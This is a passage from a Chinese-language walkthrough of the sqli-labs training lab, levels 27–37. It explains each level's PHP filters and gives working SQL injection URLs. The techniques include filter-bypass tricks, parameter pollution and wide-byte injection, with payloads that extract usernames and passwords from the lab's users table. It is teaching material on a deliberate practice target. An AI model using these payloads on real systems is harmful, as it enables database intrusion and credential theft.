-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br></pre></td></tr></table></figure>
-<p>这里解释一下正则匹配修饰符的含义：</p>
-<table>
-<thead>
-<tr>
-<th>模式修正符号</th>
-<th>功能描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>i</td>
-<td>在和正则匹配是不区分大小写</td>
-</tr>
-<tr>
-<td>m</td>
-<td>将字符串视为多行。(具体作用就是防止双写绕过)</td>
-</tr>
-<tr>
-<td>s</td>
-<td>如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。</td>
-</tr>
-</tbody></table>
-<p>通过源码我们知道了后端对那些字符进行了过滤，虽然这里对<code>union</code>和<code>select</code>做了部分过滤，但是任然存在可以绕过的漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27&#x2F;</span><br><span class="line">?id&#x3D;100&#39;unIon%0bSelEcT%0b1,database(),&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>这关在Less-27的基础上，把闭合方式改为<code>&quot;$id&quot;</code>，同时屏蔽了错误信息显示，因此无法进行报错注入。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-27a&#x2F;</span><br><span class="line">?id&#x3D;100&quot;unIon%0bSelEcT%0b1,database(),&quot;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure>
-<p>闭合方式为<code>(&#39;$id&#39;)</code>，，并且取消了select不能双写的限制，增加了对<code>union select</code>连在一起的时候且不区分大小写的过滤，且屏蔽了错误信息显示。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28&#x2F;</span><br><span class="line">?id&#x3D;100&#39;)uniunion%0bselecton%0bselect%0b1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>本关在less-28的基础上竟然还少了前面的几个限制，只留下了最后一个对<code>union select</code>的过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-28a&#x2F;</span><br><span class="line">?id&#x3D;100&#39;) uniunion selecton select 1,database(),(&#39;3</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><ul>
-<li><p>查看源码</p>
-<ul>
-<li>index.php</li>
-</ul>
-<p>并没有什么特别的，平平无奇，使用联合注入即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
-<ul>
-<li>login.php</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $id1;</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里面有2个函数，<strong>java_implimentation</strong>的作用是将传入的参数以<code>&amp;</code>分隔，如果该参数的前两个字符为<code>id</code>，则取它的第三个字符开始的30个字符作为<code>$id_value</code>，并返回<code>$id_value</code>，同时跳出循环。<strong>whitelist</strong>的作用是检查传入的字符串是否是数字，是的话就直接返回该字符串，否则就跳转到hacked.php。</p>
-</li>
-<li><p>利用方式</p>
-</li>
-</ul>
-<p>由于<strong>java_implimentation</strong>函数只要检测到一个<code>id</code>参数就退出检测，那么当我们传入2个名为<code>id</code>的参数时，后面的那一个就能绕过检测，从而可以利用其来进行注入。那么问题是，我们后端使用<code>$id=$_GET[&#39;id&#39;];</code>获取到的<code>id</code>参数究竟是第一个还是第二个呢。假设用户输入这样的语句：</p>
-  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
-<p>  Apache PHP 会解析最后一个参数</p>
-<p>  Tomcat JSP 会解析第一个参数</p>
-<p>可以看出，我们可以构造第二个<code>id</code>参数来绕过检测。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>和Less-29相比，index.php页面的错误信息显示被屏蔽了，闭合方式改为<code>&quot;$id&quot;</code>，其他照旧。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>和Less-29相比，闭合方式改为<code>(&quot;$id&quot;)</code>，其他不变。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># \ 转换为 \\</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &#x27; 转为\&#x27;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); </span><br><span class="line"><span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                         </span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用方法</li>
-</ul>
-<p>这里使用宽字节注入，在被过滤的符号前面加入<code>%df</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-32&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
-<p>此处过滤使用函数 <strong>addslashes()</strong> 返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>预定义字符是：  单引号（’）  双引号（”）  反斜杠（\）</p>
-<p>这里依然可以使用宽字节注入绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-33&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = addslashes(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= addslashes(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
-<p>和Less-33的过滤方法一样，只不过换成了POST方式提交数据，而POST方式无法直接使用<code>%df</code>来进行注入，需要用Burp Suite进行抓包改包。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305173404414.png" alt="image-20210305173404414"></p>
-<p>在图中的%27前面加上<code>%df</code>即可。</p>
-<ul>
-<li>这里还有另一种思路</li>
-</ul>
-<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘ 。我们就 可以利用这个方式进行尝试。</p>
-<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>尝试一个经典的万能密码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210305175129233.png" alt="image-20210305175129233"></p>
-<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>这一关的参数的数据类型为数字型，也就是说无需<code>&#39;</code>来闭合参数，但是这里的过滤措施和Less-33完全一致，相当与无用功。。直接进行联合注入即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><ul>
-<li>查看源码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>)</span><br></pre></td></tr></table></figure>
-<p>这里使用了**mysql_real_escape_string()**函数进行转义，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。下列字符受影响： </p>
-<p> (\x00)  (\n)  (\r)   (‘)  (“)  (\x1a)</p>
-<p>这里仍然可以使用宽字节注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-36&#x2F;?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关与 34 关是大致相似的，区别在于处理 post 内容用的是 <strong>mysql_real_escape_string()</strong> 函数，而不是 **addslashes()**函数，但是原理是一样的。都是通过截包改包的方法进行注入。或者使用将 utf-8 转换为 utf-16 或 utf-32的方法直接在hackbar进行POST请求。</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
